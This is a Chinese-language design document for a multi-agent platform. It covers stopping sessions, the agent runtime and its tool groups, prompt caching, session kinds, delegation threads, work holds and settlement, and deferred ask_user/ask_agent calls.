用户可以停止会话（`POST /api/sessions/{id}/stop`，界面上运行中显示停止按钮）。停止就是消费停止、信箱清空，连带停下它发起的异步工作。做法同 ChatGPT、Claude Code：停止前已经产生的部分照常保存，因为工具的副作用（shell、写文件）已经发生，之后的模型必须知道做过什么，否则会重复执行。

- **只取消模型运行**：`StoppableRuns` 把运行放在单独的子任务里，停止只取消它；worker 的任务没有被取消，所以与关停（它取消外层任务，已保存的步骤留着、由队列恢复或重试续跑）区分开（第 4 节）。
- **补齐已产生的部分**（`steps.save_stopped`）：每一步本来就保存了，运行中被停止时只需保存当前这一步还没保存的部分：消费者从 pydantic-ai 运行中的历史（`ctx.state.message_history`，逐步驱动时直接拿到）取出它们，还没出结果的工具调用补上「被用户停止、可能已部分执行」的结果（用 `conventions.unanswered_calls` 判断），最后一条标上 `RUN_STOPPED`，展示为「已停止」。正在生成的那段回答由 pydantic-ai 以 `state='interrupted'` 留在运行历史里，一起保存（之后也会发给模型）；其中参数还没生成完的工具调用同样补上结果，参数在落库前脱敏，截断到无法解析的 `vault_set` 参数整体替换。压缩进行中被停止时，触发压缩的那次请求已经保存，不重复补结果。未核实：被打断的思考块（没有签名）发给 Anthropic 等提供方会不会被拒，遇到时那次运行失败可见。
- **停止事务**（`sessions/halt.py` 的 `SessionHalt`，运行中被停止时在运行退出之后执行，没在运行时直接执行；一个事务，只写会话自己的数据）：
  - 让库里的历史停在不会被续跑的地方：悬空的工具调用补上「被停止」的结果（等用户回答的提问除外，用户仍可回答），末尾没得到回复的请求标上 `RUN_STOPPED`。运行中被停止时上一步已经做了；停在运行拿到运行中的历史之前（组装指令、连接 MCP 期间）、或停在等重试的运行上时，靠这一步。
  - 排队与等重试的运行记为完成，不再执行。
  - 全部 active 占用记为 cleared：之后才到的结局（后台任务结束、thread 的结清）一律不投——否则刚清空的信箱又会唤醒它。因为停止事务在运行完全退出之后，运行退出途中登记的占用也会被清掉。
  - 交给这个会话、还没结清的关联结清为「被停止」，结局交回发起方；清空信箱：还没交给模型的信件记为被丢弃（不删除，界面上划掉显示，之后再有信件交给模型就不再显示）；之后新到的信件照常唤醒消费者。
  - 被清掉的委派：给做这些工作的 thread（`delegation.threads_of_holds_in`，委派 holder → thread 的唯一推导）各发一条 `StopThread`（逐层停止，第 8 节）；发布 `SessionStopped`（带被清掉的占用），后台任务领域结束对应的进程（第 9 节）。
- **运行开始与停止的竞态**：运行任务已被领取、但还没登记可停止的运行时，停止看不到正在进行的运行，直接执行停止事务（领取了的运行不在「排队与等重试」之列，照常执行）。停止事务已让历史停在标着停止的地方、清空了信箱，于是这次运行开头没有要交给模型的，按「没有要交给模型的」收尾：只看要不要唤醒下一次，不按保存的历史收尾、不推送、不结清（结局由停止做过）。最终失败的运行在会话被停止之后被手动重试，走的是同一条路；例外是它已经保存了最终回复、只在收尾时失败的情况，这时停止没有可以标记的东西，重试会按保存的历史收尾。
- **私有 thread** 与其他会话一样可以停止（用户在它的页面上，或发问方用 `stop_thread`），发问方那次 `ask_agent` 调用拿到「被停止」的结局。
- 被停止的运行照常收尾（task 为 done、步数计入反思），不推送。

## 6. Agent 运行时

一次运行的组装（`sessions/consumer.py` 驱动，`agent_runtime/runner.py` 组装上下文与工具）：

- **原则：给模型看的是名称和描述，给程序用的是 id。** 工具参数、返回值、instructions 里只出现 agent 名称；名称唯一，由工具层（`AgentService.find_by_name`）解析为 id，写错时把可用名称列表作为错误交还模型。id 只会作为文件路径的一部分（`agents/<id>/…`）出现在工作目录里。`tests/test_flow.py::test_model_sees_agent_names_never_ids` 守住这条规则。
- **instructions** = 公共 prompt + agent 自身指令 + 运行上下文（agent 名、工作目录、session 来源的说明——由会话领域给出（`sessions.origins.origin_note`），运行时不认识来源）+ memory 全文 + skill 索引（名称、描述、作用域）+ 自我进化守则。**只放同一个会话的不同运行之间不会变的内容**：instructions 渲染成提供方的 system，缓存断点就放在它末尾（下面「prompt caching」），里面只要有一个每次运行都不同的值，整段历史每次运行都要重新写入缓存，同一个 agent 的不同会话、反思、压缩也只能复用工具定义那一段。
- **运行上下文**（`instructions.build_run_context`）= 必须随运行变化、因而不能进 instructions 的那几行：当前时间，「回答交给谁」（`Audience`，由这次运行处理的信件推导，同一个会话的不同运行会不同），以及工具组在这次运行连接时发现、要告诉模型的问题（`RunScope.notices`，如不可用的 MCP server，`instructions.with_notices` 一条一行接在后面；它们在进入 pydantic-ai 的 iter、工具组连接之后才齐，所以由 `StepHooks.started` 交给 `sessions.steps`，每次驱动覆盖一次）。会话来源（`Origin`）是会话创建时定下的，留在 instructions 里。它作为单独一段用户消息挂在**这次运行新增的第一条请求**上（`conventions.attach_run_context`，`sessions.steps` 在信件并入之后挂），随消息入库、之后原样重放——旧消息字节不变，缓存才命中；会话条目里不展示它（`transcript.to_items` 按 `RUN_CONTEXT` 跳过），它不是用户说的话。从历史续跑、重发末尾那条已保存请求的那一步不挂（改已保存的消息就等于作废它之前的缓存），这段留给这次运行的下一条新请求。运行中途压缩把挂着它的那条请求压进了摘要时（长运行会切过自己的开头），下一条新请求重新挂一段（`RunState.run_context_row` 记下挂在哪条消息上）。没有历史的运行（反思、临时 agent）直接放在 prompt 前面（`AgentRuntime._execute` 在工具组连接之后、第一个节点运行之前写进 prompt）。
- **toolsets**（每个领域一个模块，各领域的 `tools.py` 与 `agent_runtime/*_tools.py`）。对话里开放哪些由 agent 的 `tool_groups` 决定。组的目录在 `tool_catalog.py` 唯一登记（组名、界面标签、新建时是否默认开启、是否依赖 `[web]`）：`AgentService` 用它校验，`/api/agent-defaults` 把标签下发给界面，`get_agent` 给模型列出每个组实际包含的工具（组合根从各组注册的工具集取工具名，MCP 组的工具按运行构建，只说明命名方式），不另写一份描述，反思的限制用它导出的常量，组合根按它给每组接上实现（`agent_runtime.runner.ToolGroups`）。组：`workspace`、`temp_agent`、`delegation`、`notify`、`agents`、`public_skills`（写公共 skill）、`mcp`（使用 MCP server）、`mcp_admin`（管理 MCP）、`vault`、`triggers`、`issues`（issue 看板）、`web`（只在配置了 `[web]` 时存在）；私有 skill、memory 与自己的指令（自我改进）总是开放，读公共 skill 也总是可以；向用户提问（`ask_user`，见第 7 节）也总是开放并总是列出（工具列表在 prompt 缓存前缀的最前面，随运行增减会让整个前缀失效），但只在用户等着这次运行的回答（`Audience.USER`）时可用，否则调用被拒绝、交还模型。每种运行各用自己的工具组合（`RunProfile`），工具里不做「这是哪种运行」的运行时检查：有会话的运行按 `tool_groups` 组合，反思只开放自我改进以及该 agent 本来就有的 `public_skills`（`tool_catalog.REFLECTION_GROUPS`），临时 agent 是固定的一组。**工具列表只由 agent 配置（`tool_groups`）与运行种类（`RunProfile`）决定，不随单次运行的状态变化**（工具定义在 prompt 缓存前缀的最前面，列表一变整个前缀失效）：不用 `prepare` 按运行状态隐藏工具；依赖运行状态的前提（例如 `ask_user` 要有用户在等）在调用时检查，不满足就抛领域错误、交还模型。新建 agent 默认开启目录里标为默认的组；处理不可信输入（外部事件、网页内容）的 agent 应只开放需要的组，限制提示注入能造成的后果。临时 agent 有固定的工具集（文件与 shell，加上调用方可见的 MCP 与配置了的网页搜索，不看调用方是否选了 `mcp`；`temp_agent` 本来就等同于全部权限），不受 `tool_groups` 影响：
  - 局部修改（`update_agent`、`trigger_update`）由领域服务在一个事务里读取并只改给出的字段，工具层不读后整体写回：同一响应里并行的多个修改、以及用户在界面上的同时修改互不覆盖。面向模型的错误信息只带名称，不带 id。
  - `workspace`：`read_file`（单行超过 2000 字符截断）/ `write_file` / `edit_file`（`replace_all` 替换全部；`edits` 一次改同一文件的多处，依次作用、任何一处失败就整体不写盘，报错指出第几处，规则在 `platform.text_edit.replace_each`；失败时说明多处在哪几行、或最接近的是哪几行只差空白）/ `share_file`（把文件发给用户，见第 7 节「附件与文件」）/ `run_shell`（cwd = 工作目录，最小环境变量，可按 key 注入 secret，输出中的 secret 明文被替换为 `[secret:KEY]`；`background: true` 时作为后台任务运行，见第 9 节）/ `job_status` / `job_kill`。后台任务的部分只在会话版的工具集里（`jobs.tools.session_workspace_toolset`，有会话的运行用它；临时 agent 用不带后台任务的 `agent_runtime.workspace_tools.workspace_toolset`），所以没有会话的运行里根本没有这些工具。不做强隔离——按需求为单人本机使用。不自己实现搜索工具：搜索靠 shell 里的 ripgrep（`rg`，本机需安装），run_shell 的说明里写明用法，并要求读改文件用专用工具而不是 cat/sed；说明里还写明输出上限（`runtime.tool_output_max_chars`，与 web_fetch 共用），提醒模型自己用 `head`/`tail`/`rg -m`/`cut -c` 控制输出长度。
  - `skills`：`read_skill`（私有或公共）/ `write_skill` / `edit_skill`（改正文的一部分：替换恰好出现一次的片段，或追加；这条规则只在 `platform.text_edit.edit` 写一次，指令、skill 正文与 `edit_file` 共用；可选 `description` 同时或单独改描述，一次提交；什么都不改是错误，规则在 `SkillStore.edit`，私有与公共共用）/ `delete_skill`（只限私有）；写公共 skill 在 `public_skills` 组：`write_public_skill` / `edit_public_skill` / `delete_public_skill`。
  - `memory`：`memory_append` / `memory_replace`，超长时 `ModelRetry` 告诉模型至少要腾出多少字。工具的领域错误一律先 `ModelRetry` 交还模型修正；同一工具连续失败用完重试预算（`TOOL_MAX_RETRIES`）后改为 `ToolFailed`，模型看到失败结果、换做法或跳过这步，不终止整轮运行（`DomainErrorsAsRetry`）。
  - `instructions`：`instructions_replace`（改自己的指令：替换恰好出现一次的片段，或追加），每次修改记一版、作者是自己。
  - `agents`：`get_agent` / `create_agent` / `update_agent`（只改给出的字段，可以改自己）/ `delete_agent`（不能删除自己） / `get_public_prompt` / `set_public_prompt`。指令与公共 prompt 的修改都留版本，作者记为做出修改的 agent，用户可回滚。
  - `delegation`：`list_agents`（返回 name、description）/ `delegate_task` / `ask_agent` / `list_threads` / `stop_thread`（停止一个 thread：结束它正在进行的运行、清空它的信箱）（按名称指定目标 agent、按 thread 名指定子会话，见第 7 节）。
  - `notify`：`notify_user`（显式 Web Push）。
  - `temp_agent`：`run_temp_agent(task, instructions?, model?)`：一次性的临时 agent，在调用方那一步里同步运行（同一响应中的多次调用并行），返回它的最终回答。它只有文件与 shell 工具（工作目录在 `data/tmp/` 下临时创建、结束即删除）、调用方的 MCP，以及配置了 `[web]` 时的 `web_search` / `web_fetch`，secret 按调用方的视角解析；没有记忆、skill、会话、反思与委派，也不能再开临时 agent。适合抓取网页并总结、分析文件这类做完即丢的事；需要长期积累的专长应 `create_agent` 后委派。临时 agent 不是沙箱：它和调用方有相同的 shell 权限、secret 与 MCP，工具说明里也这样告诉模型。和长期 agent 一样不设模型请求数上限；失败（如模型 API 错误）向上传播，按调用方那次运行的失败统一处理（暂时性失败重试，续跑时这次调用补上「被中断」的结果，不重新执行）。工作目录在 finally 里删除；删除失败或进程中途被杀时留到下次启动，由启动时清空 `data/tmp`（只归临时 agent 使用）统一收敛，删除失败记 error 日志、不改变运行结果。启动时删不掉的目录（例如脱离进程组的后台进程还在写）同样记 error 日志后跳过，不阻止服务启动：残留目录只占空间，不影响正确性。
  - `mcp_admin`：`mcp_list`（含已停用的）/ `mcp_add`（写入前实际连接并列出工具，连接失败直接把错误还给 agent）/ `mcp_set_enabled` / `mcp_remove`。改动从下一次运行起生效。
  - `vault`：`vault_list` / `vault_set` / `vault_delete`（scope = `private` | `public`，默认私有）。没有读取明文的工具；`vault_set` 的 value 参数在消息落库和推送到前端前被替换为 `[redacted]`，参数校验失败时交还模型的错误（`RetryPromptPart` 里 pydantic 错误的 `input`，缺字段时就是整个参数）同样替换；重试用完时运行失败的 `UnexpectedModelBehavior` 去掉挂着校验错误的异常链再抛出（`redaction.tool_input_kept_out_of_failures`），日志的 traceback 里也没有参数原文（`agent_runtime/redaction.py`；要脱敏的工具参数由 vault 声明为 `vault.api.SECRET_TOOL_ARGS`，tests/test_tool_schemas.py 断言它们在注册的工具 schema 里存在）。
  - `triggers`：`trigger_kinds` / `trigger_list(finished?)` / `trigger_create(name, kind, prompt, config, agent?)` / `trigger_update` / `trigger_run` / `trigger_delete`，一组工具覆盖所有触发方式，差异只在 `kind` 与 `config`。agent 同样按名称指定；`trigger_list(finished=true)` 列已归档的（跑完的一次性触发器），只能看不能改。webhook 的 token 只能由用户在界面上生成，agent 拿不到也不需要。
  - `issues`：`issue_list` / `issue_show` / `issue_create` / `issue_update` / `issue_comment`（见第 21 节）。
  - `web`：`web_search(query, count)` / `web_fetch(url)`，经 `muliao.agent_runtime.web.WebProvider` 完成；具体服务由配置 `[web]` 的 `type` 选择（现有 `deepseek`，即 DeepSeek 的 Search / Fetch API），新增一种服务 = 一个实现加一个 `type`。query 长度、条数上限、URL 规则以服务端校验为准，不在本地重复：服务端拒绝（400/403/404/413）作为可纠正的错误交还模型；限流、超时、5xx 是暂时性失败，按运行失败统一重试；key 无效、余额不足等配置问题让运行失败。抓取的正文按 `runtime.tool_output_max_chars` 截断。没配置 `[web]` 时没有这个组，已有 agent 仍选着它会让启动失败并列出这些 agent。
  - `mcp`：该 agent 可见的 MCP server（公共 + 私有），以 `<server名>_` 为工具前缀。它和其他组一样是一组工具，实现是 pydantic-ai 的 `DynamicToolset`，每次运行按当时的配置构建（配置归 agent 领域 `agents/mcp.py` 的 `McpRegistry`，与 skill、memory 一样是带版本的资源；把配置连接成工具归运行时 `agent_runtime/mcp.py` 的 `McpConnector.toolset`，新增时的连接验证 `probe` 由组合根注入给配置），所以改动从下一次运行起生效；配置只有一个类型（`McpConfig`，存储的配置缺字段直接报错，不补默认值）。配置中的 `${vault:KEY}` 在运行时按 server 归属者的视角解析（公共 server 只能引用公共 secret），引用不可见的 key 时这个 server 不可用。**一个 server 出问题只影响它自己**：配置坏了、引用的 secret 不在了、连不上（`mcp._Reachable` 逐个连接），这次运行就没有它的工具，其余 server 照常可用；原因打 warning 日志，并作为 `RunScope.notices` 接在这次运行的运行上下文后面告诉模型（见第 6 节「运行上下文」）。暂时性的连接失败也是跳过，不再让整次运行失败重试。连接、列工具、调用工具失败时异常文本可能带着代入后的 secret（如 SSE 传输的 HTTP 错误带完整 URL），运行期（连接、列工具、调用、断开）与添加时的探测都经 `mcp._SecretSafe.guard` 换成脱敏后的 `McpFailed`（暂时性失败仍是 `TransientError`；异常组展开子异常），不带原始异常链，tasks.error、日志与探测结果里都没有明文；交还模型的 `ModelRetry`/`ToolFailed` 保留类型、只脱敏信息。secret 每次构建只解析一次，代入配置与脱敏用同一份。HTTP 客户端（httpx/httpx2）逐请求的 INFO 日志带完整 URL，`logging_setup` 把它们调到 WARNING。
- **model**：agent 的 `model` 字段格式为 `<provider 名>:<模型名>`，provider 在配置文件 `[llm.providers.<名>]` 中定义（类型、api_key、base_url）。`llm.ModelRegistry` 是唯一按配置构造模型的地方，每个 provider 复用一个客户端；每种类型怎么接（官方地址、客户端、模型、模型名查询）在 `llm.KINDS` 里各登记一行（`ProviderKind`），不按类型分支。API key 与 base_url 只来自配置：base_url 未填时显式传入该类型的官方地址，不让 SDK 回退到 `*_BASE_URL` 环境变量。SDK 仍可能读取少数无法通过参数关闭的环境变量（如 `OPENAI_ORG_ID`、自定义请求头），launchd 服务只设置 `PATH`，不会带入这些变量。界面上选模型时，provider 下拉框来自配置（`GET /api/providers`），模型名由 `ModelRegistry.list_models` 向该 provider 实时查询（`GET /api/providers/{name}/models`，即各家的 models 接口），不维护本地模型清单；查询失败返回 502 并带上原因，不用猜测的列表兜底。
- **prompt caching**：`type = "anthropic"` 的 provider 默认开启 Anthropic 的 prompt caching（`llm.ANTHROPIC_CACHE_SETTINGS`，作为 `AnthropicModel` 的默认 settings，运行时不再逐次合并）。缓存断点放在每次请求都原样重发的前缀上：指令（含公共 prompt、记忆、skill 目录）、工具定义、消息末尾，共三个，不超过 Anthropic 一次请求最多 4 个的上限。这三个断点要起作用，前缀必须逐字节稳定：指令里不放随运行变化的值（当前时间等走运行上下文，见第 6 节），已经保存的消息不再修改。用逐块的 `anthropic_cache_messages` 而不是服务端自动放断点的 `anthropic_cache`：这个类型也用于 Anthropic 兼容的网关，它们不一定支持顶层的自动缓存参数。配置里 `prompt_cache = false` 可以关掉（不发送任何缓存设置）；它只对这个类型有意义，填在别的类型上直接报错而不是静默忽略。缓存命中与写入的 token 记在用量里（第 19 节）。

## 7. 会话领域

**职责**：会话、thread 树、信箱、历史、挂起的调用、运行（消费者与逐步保存）、压缩、停止、删除、会话种类的规则。会话 actor（lane）是运行的串行边界，会话领域的一个本地事务是状态的一致性边界。对外接口在 `sessions/api.py`，发布的事件与接收的定向命令在 `sessions/events.py`。

### 会话种类

会话的行为差别只在 `sessions/kinds.py` 定义一处（`KindPolicy`），别处读策略，不按种类分支：

| 种类 | 由谁开出 | 私有 | 用户能写 | 列在会话列表、标未读 | 归父会话所有（随它删除、不能单独删除） | 回答交给 | 续聊用 |
|---|---|---|---|---|---|---|---|
| `conversation` | 用户、触发器 | 否 | 是 | 是 | 否 | 用户（在等时） | — |
| `thread` | `delegate_task` | 否 | 是 | 是 | 否 | 用户（在等时）；`report_back` 交回父会话 | `delegate_task` |
| `private_thread` | `ask_agent` | 是 | 否（只读） | 否（从父会话进入） | 是 | 发问的 agent（作为 `ask_agent` 的结果） | `ask_agent` |

thread 种类只由委派创建（`origin` 为 delegation，带父会话，`KindPolicy.opened_by_delegation`），新建会话时检查种类与来源一致；按发送方定位会话只在顶层种类里找（`kinds.TOP_LEVEL`）。「私有」（只有开它的会话能继续，`list_threads` 与界面据此标出）与「用户能写」是两条规则，碰巧对同一种类成立。会话接口随会话下发 `user_writable`、`deletable` 与 `private`，界面不另写一份规则。续聊工具名与工具注册共用常量（`kinds.DELEGATE_TASK`、`deferred.ASK_AGENT`），tests/test_tool_schemas.py 断言它们都已注册。

会话列表（`SessionService.list`）把此刻有运行在进行的会话（run task 处于 running，不含排队与压缩）置顶，其余按最近更新排序；列表接口的每一行（`SessionListItem`）带工作状态 `state`（`SessionActivity` 的同一条规则，见下文「工作状态」），界面据此标记「运行中」（转圈）或「等待中」（沙漏）；按 agent 分组时，不空闲的会话单独成一个「进行中」区，置于所有 agent 分组之上（带 agent 名），其余会话再按 agent 分组。运行开始与结束都有 task 事件，列表据此重新拉取。

**工作状态**（`activity.work_states_in`，唯一规则；会话列表、issue 看板、定时触发避免重叠、`list_threads` 与委派的运行中检查都用它）：`running` 会话的 lane 上有排队或进行中的任务，或有投给它、还没投递的 `Receive`；`waiting` 运行停了但在等外面的结果——有 active 占用（后台任务、委派出去的工作）或还能回答的 ask_user 提问；否则 `idle`。running 与 waiting 都是「事情还没做完」：等待中的会话结果回来会自动接着做，所以除了展示，各处只区分 idle 与否。批量计算，查询次数与会话数无关（列表一次几百个，事务持有全局写锁）；挂起的提问只可能在最后一条模型回复里（之前每条回复的调用在下一条回复前都已有结果），所以只读最后一条回复起的消息（`history.since_last_response`），不加载整段上下文。它与删除检查回答不同的问题：挂起的提问没有人在外面做事，不挡删除；删除检查同样批量查（lane 与 active 占用各一次）。挂起的调用（`pending.pending_in`、唤醒的 `wake_in`）也同理只读最后一条回复起的消息；需要整段上下文的只有消费者与停止。

### thread 与结果路由

agent 之间的委派有两种形态，都是「往某个 thread 的信箱投一封信」，thread 由自己的消费者经 worker 运行：

| 工具 | 父 agent | 子 session | 处理它的运行的回答 |
|---|---|---|---|
| `delegate_task(agent, task, thread)` | 立即继续，不等 | 公开 thread：进收件箱，用户可追问 | 推送给用户；父 agent 拿不到 |
| `delegate_task(..., report_back=true)` | 立即继续，不等 | 同上 | 不直接推送，作为事件交回父会话（第 8 节） |
| `ask_agent(agent, message, thread)` | 停在这次调用上等回信（见「挂起的调用」） | 私有 thread：不进收件箱，用户只读 | 作为这次调用的结果交回父 agent |

**界面上 thread 显示在开出或续写它的那次调用处**：两个工具都把 thread 的会话 id 挂在工具结果的 metadata 上（`conventions.TOOL_THREADS`，与 `TOOL_ATTACHMENTS` 同一约定，不发给模型、随消息持久化、实时条目里也带），父会话页把 thread 显示在那次调用的过程组下方，而不是统一列在会话末尾（那会让早先的 thread 看起来属于最新的对话）。没有任何条目引用的 thread 列在末尾「未关联到调用的 thread」：开出后调用被用户停止的（停止补上的结果不带 thread）、开出后调用失败的（交还模型重试的结果不带 thread）。不为后两种补记 metadata，那会把这个约定散到停止与重试的路径里。历史里引用的 thread 不在会话的 thread 列表中，说明它已被删除，显示为「thread 已删除」。

- **thread**：父 session 内对子 session 的具名引用（`sessions.parent_session_id` + `thread`，同一父 session 内唯一）。模型只用 thread 名，不接触 session id。同名即续聊，对方的上下文保留（例如审查 → 修改 → 再审查）。thread 的 agent 与种类在创建时确定，用错工具续聊时以可纠正的错误交还模型（`KindPolicy.continued_by`）。
- **推送按信件、不按 session**：每封信件带「用户是否在等它的回答」（`awaited`，由投信的入口设置，见第 14 节）。一次运行处理过的信件里有用户在等的，就把它的回答推送给用户；否则不推，agent 可以自己 `notify_user`。同一个公开 thread 里，父 agent 委派的任务与用户的追问都推送；`report_back` 的委派不推送，结果交回父 agent。
- **回答交给谁**（`platform.tooling.Audience`，工具的共同契约，不入库，`KindPolicy.audience`）：运行开始时由会话种类与它处理的信件推导一次，决定 `ask_user` 能否调用与运行上下文里怎么说（它随运行变化，所以在运行上下文里而不是 instructions 里，见第 6 节）：私有 thread 是 `agent`；处理过的和信箱里排着的信件有用户在等就是 `user`；否则 `none`。运行中途才到的、用户在等的消息会被这次运行处理、收尾时推送，但这次运行的工具与指令不随之改变（工具集在 pydantic-ai 运行开始时固定）；提问要等下一次运行。
- **私有 thread** 有自己的信箱和消费者，可以开后台任务、`report_back`、被停止（发问方那次调用拿到「被停止」）。`ask_user` 在私有 thread 里调用会被拒绝（没有用户在等）。
- **删除**（`deletion.delete_sessions`，删会话与删 agent 唯一的规则）：一个事务删除会话与（逐层）归它所有的私有 thread；公开 thread 保留（`parent_session_id` 置空）。任一被删会话忙时拒绝（判断只看会话自己的数据，无异步窗口）。交给被删会话、还没结清的关联以「被删除」结清并交回发起方；它自己发起的委派（占用）随它删除，之后 thread 的结局没有收件人。发布 `SessionDeleted`，其他领域各自清理引用它的数据（指向它的通知）；job 行保留终态。

### 占用与结清

**占用**（`sessions/holds.py`）：别的领域为某个会话开始一项异步工作时，在会话上登记一个占用（不透明的 holder：后台任务 `job:<id>`，委派 `delegation:<发起会话>:<工具调用 id>`）。会话只知道「有人替我在外面做事」，不知道是什么事。占用行永久保留，带状态：

| 状态 | 含义 |
|---|---|
| `active` | 工作还在进行：会话不算做完，交给它的委派不结清；会话算忙，不能删除 |
| `released` | 结局已经交回（和一封信件同一事务，`work.deliver_in`） |
| `cleared` | 会话被停止，工作被放弃：之后才到的结局一律不投 |

占用可以带 `call_id`：这项工作的结局要作为那次挂起调用的结果交回（`ask_agent`）。**「这次调用已经交出去」= 本会话有带这个 `call_id` 的占用，不论状态**，是永久事实（`holds.called_in`）。

**交回结局**（`work.deliver_in`，唯一出口）：一项占用的结局交回会话（后台任务经 `WorkEnded`，委派由 thread 结清时在同一事务里），和释放占用同一个事务：发起方还停在这项占用对应的挂起调用上 → 一封回答信件，作为调用的结果交回；否则 → 一封事件信件（来源如 `thread:<子会话>`、`job:<id>`）。占用已 `cleared` → 不投（`DROPPED`）；会话已删除 → `GONE`。「迟到的回答改为事件」只在这里。按幂等键去重，重放只投一次。

**运行中检查**（`mailbox.post_check_in`）：`platform.checks.WorkWatcher` 每隔 `runtime.job_check_seconds`（默认 60 秒）让后台任务与委派给还在进行的工作向发起会话投一封检查信件（不推送）；同一来源已有信件在信箱里排着时不再发，占用已不是 active 时不投，事件不会在等回答时堆积。不需要了就 `job_kill` 或 `stop_thread`。

**关联与结清**（`sessions/settlement.py`）：委派来的信件带关联 id（它的 holder）。会话自己判断关联什么时候结束，在同一个事务里把结局交回发起方（第 8 节），时机只有下面几个，每个时机一个入口（结清哪些信件只在 settlement 里决定，调用方不传状态集合）：

- **完成**：运行结束的事务里（`sessions.finish`），运行正常结束、没有停在挂起的调用上、信箱里没有还要交给模型的信件、没有 active 占用 → 会话内已处理、还未结清的全部关联以 `finished` 结清，带回答与文件（`settle_finished_in`）。占用释放总是伴随一封信件，信件会唤醒下一次运行，结清由那次运行结束时判断。
- **最终失败**：队列记失败的事务里（`RunHandler.failed_in`），会话内已处理、还未结清的全部关联，加上交给过这次运行、还排着的（运行在第一次保存之前就失败时，开头取走的信件一直排着，它们不会再唤醒运行，`mailbox.handed_to`；它们随之记为被丢弃），以 `failed` 结清（`settle_failure_in`）；同一个事务里接着 `wake_in`：运行开始之后才到的信件（如对同一 thread 的第二项委派）当场唤醒下一次运行，不等对账。按会话范围而不是按处理它的运行，所以早先停在 `ask_user` 上的运行处理过的委派、被续跑接管的信件都包括在内。`failed_in` 自己失败时（worker 不带钩子记下失败），由信箱对账（`sessions/reconcile.py` 的 `MailReconciler` 调 `reconcile_failures`）以同一个函数补做，每个会话一个事务。
- **停止 / 删除**：未结清的关联（排着的与已处理的）以 `stopped` / `deleted` 结清（`settle_stopped_in` 随后清空信箱 / `settle_deleted_in`）。

`mail.correlation_settled` 保证每个关联只结清一次，交回与结清、占用的释放在同一个事务里，所以每项委派的结局只交回一次（第 8 节）。

**发布的事件**：

| 事件 | 时机 | 订阅者 |
|---|---|---|
| `RunEnded` | 运行结束（完成、挂起、停止；没有可交给模型的空闲收尾不发） | 通知（推送）、反思（数步数） |
| `SessionStopped` | 停止事务，带被清掉的占用 | 后台任务 |
| `SessionRead` | 用户标记会话已读（每次都发，不论原本是否未读） | 通知（指向它的通知已读） |
| `SessionDeleted` | 删除，每个被删会话一条 | 通知 |
| `AgentSessionsCleared` | 删除 agent 的流程里，它的会话已全部删除 | agent |

接收的定向命令：`WorkEnded` / `WorkCheckIn`（后台任务的结局与运行中检查，来源与幂等键由会话领域按占用者推出）、`Receive`（触发器的来信）、`StopThread`（自己发给自己：停止委派出去的 thread）。

### 挂起的调用（`ask_user` 与 `ask_agent`，`sessions/pending.py`）

两者是同一件事：**模型调用了一个要等别人回信的工具**。工具抛出 pydantic-ai 的 `CallDeferred`，这次运行停在这里正常结束，不占 worker、不在 worker 里等。回信是一封回答信件（`MailKind.ANSWER`，`tool_call_id →` 带工具名的结果信封 `{"tool": "ask_user" | "ask_agent", "result": …}`，读的一方按 `tool` 区分，不按形状），消费者开始下一次运行时把它作为 `DeferredToolResults` 交回，模型看到的就是「我问了，对方这样答」。

两者的差别只写在一张表里（`sessions/deferred.py` 的 `DeferredTool`），各处查表，不按工具名分支；工具注册时显式用表里的名字：

| 工具 | 要占用才算挂起（`needs_hold`） | 没交出去时可原样重放（`replayable`） | 停止时仍挂着（`kept_open_on_stop`） | 调用里给用户的问题（`questions`） | 没等到回答就继续时的结果（`skipped_result`） |
|---|---|---|---|---|---|
| `ask_user` | 否 | 否（没结果的总是挂着） | 是 | `questions_of` | 没回答 / 跳过 |
| `ask_agent` | 是 | 是 | 否 | 无 | `STILL_WORKING` |

- **哪些调用还挂着**由历史推导（`pending_calls`），不另存状态：没有结果的 `ask_user` 调用等用户；没有结果、并且已经交出去（本会话有带它的调用 id 的占用）的 `ask_agent` 调用等 agent（没有占用的不算挂着：回复保存后、投递提交前失败，它是待执行的调用，续跑时再执行——这一步里还有别的没出结果的调用时整步都不重放，见「从哪里开始」）。「调用是否已有结果」只在 `conventions.unanswered_calls` 定义一处，参数被拒绝、交还模型重试的调用也算有结果。挂起的调用只可能在历史末尾：之后的运行都会先关闭它们。
- **什么时候继续**（`waiting`，唯一规则）：用户发了新消息（跳过还没回答的），或挂起的调用都有了回答；事件（检查、完成通知）留在信箱里，等它们一起交给模型。唤醒（`mailbox.wake_in`）与消费者开头共用这一条。
- **跳过**：pydantic-ai 拒绝在未处理的调用后追加新消息，所以用户发了新消息时，没回答的 `ask_user` 显式记为「用户没回答、发了新消息」（同一次提交里回答了别的提问时记为跳过），还没回答的 `ask_agent` 记为「它还在处理，回答会作为事件送达」（`STILL_WORKING`）——那时它已不再挂着，委派的结局按事件投回（第 8 节）。结果随那一步保存。
- **迟到的回答**：回答投信之后、交给模型之前，调用可能已被另一次运行关闭（用户先发了消息）。这时回答作为一段用户消息交给模型（`pending.late_text`），不丢、也不让运行卡住。
- **续跑**：`ask_agent` 被重新执行（续跑那一步）时按调用 id 幂等（`Threads.dispatch` 的 holder 由调用 id 派生），已经投过就只再挂起，不重复投信。

**`ask_user`**：做法同 Claude Code 的 AskUserQuestion、Codex 的提问：一次 1 到 4 个选择题（单选或多选，每题 2 到 6 个选项），界面上每题总能在「其他」里自己写。工具总是列出，只在 `Audience.USER` 时可用，否则抛领域错误交还模型（`sessions/ask_user.py`；不用 `prepare` 隐藏，以免工具列表随运行变化破坏 prompt 缓存）。

- 运行停在提问上时通知用户「等你回答：…」。
- 界面把回答随消息提交（`answers: {tool_call_id: [每题的回答]}`，可以没有文字），`inbound.receive` 校验它针对现在能回答的提问（`inbound.open_asks`：还挂着、也还没有回答在信箱里排着的），选项属于该题、单选至多一个、每题都有选择或「其他」，然后把交给模型的结果（`AskResult`：`answered` 加每题的选择，或没回答时的说明）存在回答信件里。回答交给模型之前一直排着（运行失败重试时也还在），所以不需要别的条件。
- 展示：提问不收进过程组。每个 `ask_user` 条目的状态由后端按唯一规则给出（`transcript.annotate_asks`，会话接口与实时条目共用投影）：`asking`（运行还没停下）、`pending`（显示表单）、`submitted`（回答已提交、还排着，回答显示在信箱里）、`answered`（显示问题与选择）、`not_answered`；被退回的调用（参数被工具 schema 拒绝，或没有用户在等这次运行的回答）不是提问，按普通工具错误展示。前端不解析工具结果文本。

### 附件与文件

做法同主流 IM 的媒体仓库（Matrix media repository、Slack files）：先上传得到 id，消息里只放引用。

